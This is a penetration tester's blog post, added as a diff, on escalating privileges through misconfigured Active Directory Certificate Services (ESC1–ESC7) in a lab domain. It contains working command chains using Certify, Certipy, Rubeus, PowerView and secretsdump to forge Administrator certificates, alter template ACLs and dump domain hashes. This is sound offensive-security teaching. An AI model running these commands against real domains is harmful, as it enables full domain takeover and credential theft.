@@ -1,0 +1,874 @@
+I"��<p>My dear Bagginses and Boffins, Tooks and Brandybucks, Grubbs, Chubbs, Hornblowers, Bolgers, Bracegirdles and Proudfoots - it is time for some new shit.<br />
+We are going to explore the wonderful world of Active Directory Certificate Services, aka ADCS.<br />
+If you want to leave an impression on your next pentest, this one’s for you, as Microsoft’s PKI implementation is widely used but little understood (well at least in terms of security).<br />
+Same is true if you live on the blue side, as you can proactively mitigate issues an earn some bonus points with your boss, maybe.<br />
+Prepare yourself for a shitload of pictures, memes, usefull as well as meaningless information.</p>
+
+<p><img src="/images/2022-09-16/pwndpki_meme.png" /></p>
+
+<!--more-->
+<h1 id="introduction">Introduction</h1>
+
+<p>If you have not already done so, go and read the fundamental work which this blog relies on: <a href="https://specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned</a>.<br />
+It is the research from the SpecterOps guys <a href="https://twitter.com/harmj0y">Will Schroeder</a> and <a href="https://twitter.com/tifkin_">Lee Christensen</a> in the field of ADCS abuses and their mitigations.</p>
+
+<p>If you are just here to pwn stuff, you can directly jump to your desired section:<br />
+<a href="#esc1">ESC 1</a><br />
+<a href="#esc2">ESC 2</a><br />
+<a href="#esc3">ESC 3</a><br />
+<a href="#esc4">ESC 4</a><br />
+<a href="#esc5">ESC 5</a><br />
+<a href="#esc6">ESC 6</a><br />
+<a href="#esc7">ESC 7</a><br />
+<a href="#esc8">ESC 8</a><br />
+<a href="#certifried">Certifried</a><br />
+<a href="#esc9">ESC 9</a><br />
+<a href="#esc10">ESC 10</a></p>
+
+<h2 id="so-what-is-adcs">So what is ADCS?</h2>
+
+<p><img src="/images/2022-09-16/sponge.png" /></p>
+
+<p>The <strong>A</strong>ctive <strong>D</strong>irectory <strong>C</strong>ertificate <strong>S</strong>ervice(s) is one of the 5 main Active Directory services from Microsoft, included (or at least installable) since Windows Server 2008 -&gt; <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd578336(v=ws.10)?redirectedfrom=MSDN">Microsoft</a>. During my pentests, I have not seen one environment, where ADCS was not installed and in use.<br />
+It’s Microsoft’s <a href="https://en.wikipedia.org/wiki/Public_key_infrastructure"><strong>P</strong>ublic <strong>K</strong>ey <strong>I</strong>nfrastructure</a> implementation for AD, or if you are as dumb as me, the service that introduces and handles certificates to your Active Directory.<br />
+Certificates can be used to authenticate users and computers, proof validity of a website (you know the little thingy in your browsers searchbar, where it warns you when the cert is invalid) or signing, e.g. a PowerShell script or executable.</p>
+
+<p>During their research, Will and Lee stumbled upon a lot of possible ways to abuse ADCS, and have the Certificate Authority do things like issue certs for other users to us, relay a Domain Controller’s authentication to the cert enrollment endpoint, so we could “become” a Domain Controller, and so on. They split the attacks into certain groups, which are: Theft, Persistence, Escalation and Domain Persistence. We will mainly (and maybe only) focus on the escalation ones in this blog post.</p>
+
+<p>Later on <a href="https://twitter.com/ly4k_">Oliver Lyak</a> extended the list of vulns (Certifried, ESC9&amp;10) and even wrote according tools to abuse those. Big shoutout to you as well buddy.</p>
+
+<h2 id="and-how-does-it-work">And how does it work?</h2>
+
+<p>Well, there are some components/terms that we first need to be aware of:</p>
+
+<ul>
+  <li><strong>C</strong>ertificate <strong>A</strong>uthortiy: That is the PKI server that generates and issues the certificates</li>
+  <li>Enterprise CA: The AD integrated CA, which offers certificate templates</li>
+  <li>Certificate Template: Thats like a blueprint for a cert, which defines what a cert is for, what an enrollee needs to supply as info, who is allowed to enroll and so on</li>
+  <li><strong>C</strong>ertificate <strong>S</strong>igning <strong>R</strong>equest: That is the data one sends to the CA in order to get a cert</li>
+  <li><strong>E</strong>xtended <strong>K</strong>ey <strong>U</strong>sage: These are OIDs that define what a cert can be used for, for example signing, authentication etc.</li>
+  <li>Certificate: A digitally signed (by the CA) “document” that can be used for the stuff specified within the EKU. It ties an identity to a key pair (public/private), which allows applications to identify them.</li>
+  <li>Subject: The identity the cert is bound to</li>
+  <li>PKINIT: A Kerberos extension that enables the usage of certs to request tickets</li>
+</ul>
+
+<p>To give you an overview of how a cert is issued, have a look at the following pic:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/images/2022-09-16/certissue.png" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>from <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned</a></em></td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote>
+  <p>A certificate is an X.509-formatted digitally signed document used for encryption, message
+signing, and/or authentication. A certificate typically has various fields, including some of the
+following:</p>
+  <ul>
+    <li>Subject - The owner of the certificate.</li>
+    <li>Public Key - Associates the Subject with a private key stored separately.</li>
+    <li>NotBefore and NotAfter dates - Define the duration that the certificate is valid.</li>
+    <li>Serial Number - An identifier for the certificate assigned by the CA.</li>
+    <li>Issuer - Identifies who issued the certificate (commonly a CA).</li>
+    <li>SubjectAlternativeName - Defines one or more alternate names that the Subject may go by.</li>
+    <li>Basic Constraints - Identifies if the certificate is a CA or an end entity, and if there are any constraints when using the certificate.</li>
+    <li>Extended Key Usages (EKUs) - Object identifiers (OIDs) that describe how the certificate will be used. Also known as Enhanced Key Usage in Microsoft parlance. Common EKU OIDs include:
+      <ul>
+        <li>Code Signing (OID 1.3.6.1.5.5.7.3.3) - The certificate is for signing executable code.</li>
+        <li>Encrypting File System (OID 1.3.6.1.4.1.311.10.3.4) - The certificate is for encrypting file systems.</li>
+        <li>Secure Email (1.3.6.1.5.5.7.3.4) - The certificate is for encrypting email.</li>
+        <li>Client Authentication (OID 1.3.6.1.5.5.7.3.2) - The certificate is for authentication to another server (e.g., to AD).</li>
+        <li>Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2) - The certificate is for use in smart card authentication.</li>
+        <li>Server Authentication (OID 1.3.6.1.5.5.7.3.1) - The certificate is for identifying servers (e.g., HTTPS certificates).</li>
+      </ul>
+    </li>
+    <li>Signature Algorithm - Specifies the algorithm used to sign the certificate.</li>
+    <li>Signature - The signature of the certificates body made using the issuer’s (e.g., a CA’s) private key</li>
+  </ul>
+</blockquote>
+
+<p>– <cite><em>also from <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned</a></em></cite></p>
+
+<p>I will try to walk you and me through all the possible misconfigurations, as well as pwning them.<br />
+So without further ado - let’s have some fun.</p>
+
+<h1 id="scenarios">Scenarios</h1>
+<p>In the following we will dive through all the different escalation scenarios.</p>
+
+<h2 id="general-recon">General recon</h2>
+
+<p>To gather general info about the CAs in the Domain we can use:</p>
+
+<p><a href="https://social.technet.microsoft.com/wiki/contents/articles/3063.certutil-examples-for-managing-active-directory-certificate-services-ad-cs-from-the-command-line.aspx#View_CA_Configuration">certutil</a></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil -dump
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/recon_1.png" /></p>
+
+<p><a href="https://github.com/GhostPack/Certify">Certify</a></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Certify.exe cas
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/recon_2.png" /></p>
+
+<p><a href="https://github.com/ly4k/Certipy">Certipy</a></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/recon_3.png" /></p>
+
+<p>Or we could just open the according mmc snap-ins on the CA itself - GUI style so to say.</p>
+
+<h2 id="esc1">ESC1</h2>
+<p>In this scenario we are dealing with a misconfigured certificate template, which allows normal users to enroll. The template allows client authenticataion and the requester can specify a <code class="language-plaintext highlighter-rouge">subjectAltName (SAN)</code>. There is also no manager approval -&gt; the request gets auto approved. The <code class="language-plaintext highlighter-rouge">SAN</code> allows the cert to hold one or more additional identities beyond the subject itself, which’s main purpose is in the context of webservers. For AD authentication, the SAN normaly holds the UPN of the according identity, which is then mapped to an AD account. If you followed along closely, you probably noticed that if we can control the SAN, we can become whoever we like to.</p>
+
+<p><img src="/images/2022-09-16/dameme.png" /></p>
+
+<h3 id="what-it-looks-like-in-ad">What it looks like in AD</h3>
+<p>We have <code class="language-plaintext highlighter-rouge">Client Authentication</code> as purpose:<br />
+<img src="/images/2022-09-16/ESC1_1.png" /></p>
+
+<p>All domain users can enroll:<br />
+<img src="/images/2022-09-16/ESC1_2.png" /></p>
+
+<p>Enrolee supplies the subject:<br />
+<img src="/images/2022-09-16/ESC1_3.png" /></p>
+
+<p>No manager approval:<br />
+<img src="/images/2022-09-16/ESC1_4.png" /></p>
+
+<h3 id="recon">Recon</h3>
+<p>Well, you could probably just open <code class="language-plaintext highlighter-rouge">certmgr.msc</code> and look if any of the templates ask for additional input, and then check if you can supply a SAN.<br />
+However, we can also issue the tools mentioned above to automate this.</p>
+
+<h4 id="native-powershell">Native PowerShell</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=mcafeelab,DC=local'
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC1_enum1.png" /></p>
+
+<h4 id="certify">Certify</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Certify.exe find /enrolleeSuppliesSubject
+or
+Certify.exe find /vulnerable /currentuser
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC1_enum2.png" /></p>
+
+<h4 id="certipy">Certipy</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC1_enum3.png" /></p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<h4 id="manually-and-rubeus">Manually and Rubeus</h4>
+
+<p>We can simply abuse this manually the GUI way with the help of <code class="language-plaintext highlighter-rouge">certmgr.msc</code>:<br />
+<img src="/images/2022-09-16/ESC1_5.png" /></p>
+
+<p>Specify our CN and as alternative name the UPN of the <code class="language-plaintext highlighter-rouge">Administrator</code> user:<br />
+<img src="/images/2022-09-16/ESC1_6.png" /></p>
+
+<p>We now have a cert with <code class="language-plaintext highlighter-rouge">Administrator</code> as the SAN:<br />
+<img src="/images/2022-09-16/ESC1_7.png" /></p>
+
+<p>Export the cert as pfx.</p>
+
+<p>Nicely ask the DC for a TGT with Rubeus and do a pass the ticket attack:</p>
+
+<p><img src="/images/2022-09-16/chuck.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:Administrator /certificate:esc1.pfx /password:test /ptt
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/ESC1_8.png" /></p>
+
+<h4 id="certify-1">Certify</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC1" /altname:"Administrator"
+or
+.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC1" /altname:"Administrator" /install
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC1_exploit1.png" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">/install</code> flag will …</p>
+
+<p><img src="/images/2022-09-16/drumroll.png" /></p>
+
+<p>… install the requested cert to our current user’s cert store.<br />
+This allows us to export the cert as described in <a href="#manually-and-rubeus">Manually and Rubeus</a> via the GUI, without the need for some linux / openSSL magic.</p>
+
+<p>But we can of course go the openSSL route to create the cert:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 -in cert -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC1_exploit2.png" /></p>
+
+<p>and then let Rubeus do its magic.</p>
+
+<h4 id="certipy-1">Certipy</h4>
+
+<p>Certipy can be leveraged to request a ticket and fetch a TGT and get the pwnd user’s NT hash - Thank you Oliver for Certipy &lt;3</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC1' -upn 'Administrator@mcafeelab.local'
+certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -username 'Administrator' -domain 'mcafeelab.local'
+</code></pre></div></div>
+
+<p>We can now do some PTH thingy to pwn the domain:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py -just-dc -hashes 'aad3b435b514...:...f7207931' 'mcafeelab.local/Administrator@dc2016-2.mcafeelab.local' 
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC1_exploit3.png" /></p>
+
+<h2 id="esc2">ESC2</h2>
+<p>No matter how often I red through all the stuff I found regarding ESC2, I can’t wrap my head around it completely.<br />
+It describes the case, where there is either the <code class="language-plaintext highlighter-rouge">Any purpose</code> SKU set, or no SKU at all (which would be called a SubCA cert), which utlimately would allow the cert to be used for anything we like. Also low priv users need enrollment rights and no manager approval is in place.<br />
+It is however not abusable like ESC1, if we can’t specifiy the SAN.<br />
+A cert with no SKU could additionally be used to sign other certs. Unfortunately these can’t be used for domain auth by default, as the <code class="language-plaintext highlighter-rouge">NTAuthCertificates</code>(see p. 14 of the whitepaper) object won’t trust them.<br />
+So the abuse cases are not clear to me. We might stumble upon a cert in a forgotten folder of some other user, maybe. But we are not able to request them. The thing that comes to my mind is relaying, and that might actually work.<br />
+UPDATE:  After releasing the blog, Oliver reached out to me and helped me at quite some topics regarding ADCS. In this case you can abuse ESC2 exactly like <a href="#esc3">ESC3</a>, if the templates you want to target are <code class="language-plaintext highlighter-rouge">Schema Version 1</code>, which is true for all the default templates (like <code class="language-plaintext highlighter-rouge">Doman Controller</code>, <code class="language-plaintext highlighter-rouge">Client</code>, <code class="language-plaintext highlighter-rouge">Computer</code> and so on).</p>
+
+<p>Will and Lee at least gave us a tip on how to search for them.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0
+)(!(pkiextendedkeyusag=*))))'  
+</code></pre></div></div>
+<p>This did not work in my environment. Shortening the query a bit, at least narrowed down the results:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(pkiextendedkeyusage=2.5.29.37.0))' -SearchBase 'CN=Configuration,DC=mcafeelab,DC=local' 
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC2_enum2.png" /></p>
+
+<p>But you can still just use the before mentioned tools and search for the according attribute:</p>
+
+<p><img src="/images/2022-09-16/ESC2_enum1.png" /></p>
+
+<h2 id="esc3">ESC3</h2>
+<p>Here we are facing a cert template with the <code class="language-plaintext highlighter-rouge">Certificate Request Agent</code> EKU (OID 1.3.6.1.4.1.311.20.2.1). A cert issued from this template enables us to request a cert on behalf of any user, by co-signing a new CSR for a template that allows for <code class="language-plaintext highlighter-rouge">enroll on behalf of</code> (reminds me of the delegation brainfuck :) ).<br />
+For this to work, we obviously need to meet two conditions:</p>
+<ol>
+  <li>Low priv user enrollment rights, no manager approval, <code class="language-plaintext highlighter-rouge">Certificate Request Agent</code> EKU is defined</li>
+  <li>Low priv user enrollment rights, no manager approval, issuing requires <code class="language-plaintext highlighter-rouge">Certificate Request Agent</code> cert, template allows for domain auth</li>
+</ol>
+
+<h3 id="what-it-looks-like-in-ad-1">What it looks like in AD</h3>
+
+<p><img src="/images/2022-09-16/ESC3_info1.png" /></p>
+
+<p><img src="/images/2022-09-16/ESC3_info3.png" /></p>
+
+<h3 id="recon-1">Recon</h3>
+
+<p>Look out for the afore mentioned prerequisits. However Certify and Certipy did not recognize the 2nd prerequisit matching templates as vulnerable. You can find them as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(msPKI-RA-Application-Policies=1.3.6.1.4.1.311.20.2.1)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2))' -SearchBase 'CN=Configuration,DC=mcafeelab,DC=local'
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/ESC3_enum2.png" /></p>
+
+<p>I opened a <a href="https://github.com/GhostPack/Certify/pull/22">pull request</a> for Certify. Could also quickly be done for Certipy I guess, but man I have to get this blog post rolling.<br />
+Please be aware that, due to some code changes (not related to my PR, as this also happens without it), the output is mangled up:</p>
+
+<p><img src="/images/2022-09-16/esc3_mangled.png" /></p>
+
+<h4 id="certify-2">Certify</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> .\Certify.exe find
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/vulnerable</code> would give me the first template, the 2nd one however did not pop up, which makes no sense, as it won’t be abusable if not both templates are available.</p>
+
+<p><img src="/images/2022-09-16/ESC3_info4.png" /></p>
+
+<h4 id="certipy-2">Certipy</h4>
+
+<p>Same situation as with Certify, only the first required template is found and flagged:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable 
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/ESC3_enum1.png" /></p>
+
+<h3 id="exploitation-1">Exploitation</h3>
+
+<p>Well, strange issues here again. If I happened to specify the <code class="language-plaintext highlighter-rouge">onbehalfof</code> parameter in both tools, I would get an error if I used <code class="language-plaintext highlighter-rouge">mcafeelab.local\Administrator</code>. Leaving away the <code class="language-plaintext highlighter-rouge">.local</code> part works like a charm:</p>
+
+<p><img src="/images/2022-09-16/ESC3_exploit1.png" /></p>
+
+<p><img src="/images/2022-09-16/ESC3_exploit2.png" /></p>
+
+<h4 id="certify-3">Certify</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC3_1" /install
+.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:ESC3_2 /onbehalfof:mcafeelab\god /enrollcert:ESC3_1.pfx /enrollcertpw:'Pillemann123!'
+openssl pkcs12 -in cert -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx  
+.\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:Administrator /certificate:esc3_2.pfx /password:test /ptt
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/ESC3_exploit4.png" /></p>
+
+<p><img src="/images/2022-09-16/ESC3_exploit3.png" /></p>
+
+<h4 id="certipy-3">Certipy</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC3_1'
+certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC3_2' -on-behalf-of 'mcafeelab\Administrator' -pfx lowpriv.pfx
+certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -username 'Administrator' -domain 'mcafeelab.local'
+secretsdump.py -just-dc -hashes 'aad3b435b514...:...f7207931' 'mcafeelab.local/Administrator@dc2016-2.mcafeelab.local'
+</code></pre></div></div>
+
+<h2 id="esc4">ESC4</h2>
+
+<p>This one is fun because it happens when someone fucked up with the ACLs on the AD object -&gt; you can alter the template with an unintended user. This might ultimately end up in a situation where we can compromise an otherwise unabusable template.</p>
+
+<p><img src="/images/2022-09-16/certs_meme.png" /></p>
+
+<p>This is abusable if we have write or full access to a template!</p>
+
+<h3 id="what-it-looks-like-in-ad-2">What it looks like in AD</h3>
+
+<p><img src="/images/2022-09-16/ESC4_recon3.png" /></p>
+
+<h3 id="recon-2">Recon</h3>
+
+<h4 id="certify-4">Certify</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> .\Certify.exe find -vulnerable
+</code></pre></div></div>
+
+<p><img src="/images/2022-09-16/ESC4_recon1.png" /></p>
+
+<h4 id="certipy-4">Certipy</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable 
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/ESC4_recon2.png" /></p>
+
+<h3 id="exploitation-2">Exploitation</h3>
+
+<p>Well in this case we can’t work with Certify or Certipy alone, because we need to alter the AD object / cert template. For this reason we are going to use <a href="https://twitter.com/harmj0y">Will’s</a> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> or <a href="https://fortalicesolutions.com/">Fortalice Solutions’s</a> <a href="https://github.com/fortalice/modifyCertTemplate">modifyCertTemplate</a> respectively.</p>
+
+<h4 id="powerview--certify">PowerView &amp; Certify</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Give users enrollment rights  
+Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domänen-Benutzer" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=mcafeelab,DC=local" -Verbose  
+&lt;img src="/images/2022-09-16/esc4_enrollset.png"&gt;  
+
+# Disable manager approval
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -XOR @{'mspki-enrollment-flag'=2} -Verbose
+
+# Disable signature required
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose
+
+# Enable enrollee supplies subject
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -XOR @{'mspki-certificate-name-flag'=1} -Verbose
+
+# Set application policy extension to client authentication
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
+
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/ESC4_exploit1.png" /></p>
+
+<p>Before and after altering the cert template:<br />
+<img src="/images/2022-09-16/ESC4_beforeafter.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># PWN
+.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC4" /altname:"Administrator" /install
+
+# Export the cert
+
+.\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:Administrator /certificate:esc4.pfx /password:test /ptt
+</code></pre></div></div>
+
+<h4 id="certipy-5">Certipy</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC4' -upn 'Administrator@mcafeelab.local'
+certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -username 'Administrator' -domain 'mcafeelab.local'
+secretsdump.py -just-dc -hashes 'aad3b435b514...:...f7207931' 'mcafeelab.local/Administrator@dc2016-2.mcafeelab.local'
+</code></pre></div></div>
+
+<h2 id="esc5">ESC5</h2>
+
+<p>This case describes all other possible scenarios around ACLs. Which might include:</p>
+
+<ul>
+  <li>Pwning the CA server itself to tamper around with templates and stuff</li>
+  <li>ACLs wrongly set somewhere up the line in AD - maybe where some set descendant rights somewhere in the config tree</li>
+  <li>The CA server’s RPC/DCOM server</li>
+  <li>…</li>
+</ul>
+
+<p><img src="/images/2022-09-16/esc5_1.png" /></p>
+
+<p>There is no direct abuse path, but you can use the before mentioned stuff as a guideline on how to proceed if this stuff here happens.<br />
+UPDATE: Shortly after my release I stumbled upon <a href="https://twitter.com/n00py1">n00py’s</a> tweet about ways to abuse a pwnd PKI server: <a href="https://twitter.com/n00py1/status/1574423470640873472">https://twitter.com/n00py1/status/1574423470640873472</a>.<br />
+The answer to success was the golden cert attack, which is described here: <a href="https://pentestlab.blog/2021/11/15/golden-certificate/">https://pentestlab.blog/2021/11/15/golden-certificate/</a>.<br />
+So if we pwn a PKI server we can forge a cert for everyone we like, like it is done with the golden ticket attack for Kerberos.</p>
+
+<h2 id="esc6">ESC6</h2>
+
+<p>Here we are talking about a CA specific setting which is the <code class="language-plaintext highlighter-rouge">EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.<br />
+This setting allows us, even when the template is set to build the subject name from the AD object, to specify a Subject Alternative Name.<br />
+This also means, that EVERY template for authentication is pwnable, when this flag is set.<br />
+This was fixed by Microsoft in the patch for CVE-2022–26923 (may still be worth looking for).</p>
+
+<h3 id="recon-3">Recon</h3>
+
+<h4 id="certutil">Certutil</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil -config "DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1" -getreg policy\EditFlags
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/esc6_recon1.png" /></p>
+
+<h4 id="certify-5">Certify</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Certify.exe find
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/esc6_recon2.png" /></p>
+
+<h4 id="certipy-6">Certipy</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/esc6_recon3.png" /></p>
+
+<h3 id="exploitation-3">Exploitation</h3>
+
+<h4 id="certify-6">Certify</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"user" /altname:"god" /install
+.\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:god /certificate:god.pfx /password:test /ptt
+</code></pre></div></div>
+
+<h4 id="certipy-7">Certipy</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'user' -upn 'ds@mcafeelab.local'
+certipy auth -pfx 'ds.pfx' -dc-ip '10.55.0.2' -username 'ds' -domain 'mcafeelab.local'
+</code></pre></div></div>
+
+<h2 id="esc7">ESC7</h2>
+
+<p>Here again we are talking about ACLs, this time on the CA itself. We can grant the rights to manage the CA as well as the ones to issue and manage certs:</p>
+
+<p><img src="/images/2022-09-16/ESC7_1.png" /></p>
+
+<p>Equipped with these rights, we can either directly alter the CA’s config, or approve pending requests.<br />
+If we want to abuse all this shit on a Windows box, we need the <a href="https://www.powershellgallery.com/packages/PSPKI/3.7.2">PSPKI</a> PowerShell modules.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># If you run into problems to install it, enable TLS 1.2
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+Install-Module -Name PSPKI
+Import-Module PSPKI
+</code></pre></div></div>
+
+<h3 id="recon-4">Recon</h3>
+
+<p>If we happen to have direct access to a CA, we can check just the settings from the introduction of this chapter.</p>
+
+<h4 id="pspki">PSPKI</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-CertificationAuthority -ComputerName dc2016-2.mcafeelab.local | Get-CertificationAuthorityAcl | select -ExpandProperty access
+</code></pre></div></div>
+<p><img src="/images/2022-09-16/ESC7_recon1.png" /></p>
+
+<h3 id="exploitation-4">Exploitation</h3>
+
